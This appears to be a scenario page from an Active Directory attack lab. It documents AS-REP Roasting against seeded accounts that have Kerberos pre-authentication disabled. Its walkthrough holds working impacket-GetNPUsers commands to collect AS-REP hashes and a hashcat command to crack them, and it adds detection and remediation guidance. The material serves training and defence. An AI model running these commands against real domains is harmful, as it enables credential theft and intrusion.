# Scenario 2 - AS-REP Roasting

| | |
|---|---|
| **MITRE ATT&CK** | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting |
| **Toggle** | `misconfig.asrep` |
| **Role** | `misconfig_asrep` |
| **Foothold** | None - works unauthenticated if usernames are known |

## Objective

Recover a crackable hash for accounts with Kerberos pre-authentication
disabled. No valid credentials are required to request the AS-REP.

## Seeded configuration

| Account | OU | Flag |
|---------|----|------|
| `nopreauth_svc` | ServiceAccounts | `DoesNotRequirePreAuth = $true` |
| `legacy_kiosk` | Users | `DoesNotRequirePreAuth = $true` |

## Attack walkthrough

```bash
# Unauthenticated: enumerate users, then request AS-REPs for those that
# do not require pre-authentication.
impacket-GetNPUsers corp.contoso.lab/ -usersfile users.txt -dc-ip 10.10.10.10 \
  -format hashcat -outputfile asrep.hashes -no-pass

# If you have any credentials, let it find the accounts automatically.
impacket-GetNPUsers corp.contoso.lab/eevans:'<password>' -dc-ip 10.10.10.10 \
  -request -format hashcat -outputfile asrep.hashes

hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### BloodHound view

Accounts with `dontreqpreauth` are flagged; the engine reports
`AS-REP roastable accounts`.

## Detection

- **4768** - A Kerberos authentication ticket (TGT) was requested with
  pre-authentication not required, without a preceding logon.
- Correlate 4768 requests for the same account across many source IPs.

## Remediation

- Re-enable Kerberos pre-authentication on all accounts (this is the default).
- Identify exceptions with:
  `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`.
- Enforce strong, unique passwords for any account that must remain without
  pre-auth (rare).

## References

- MITRE T1558.004
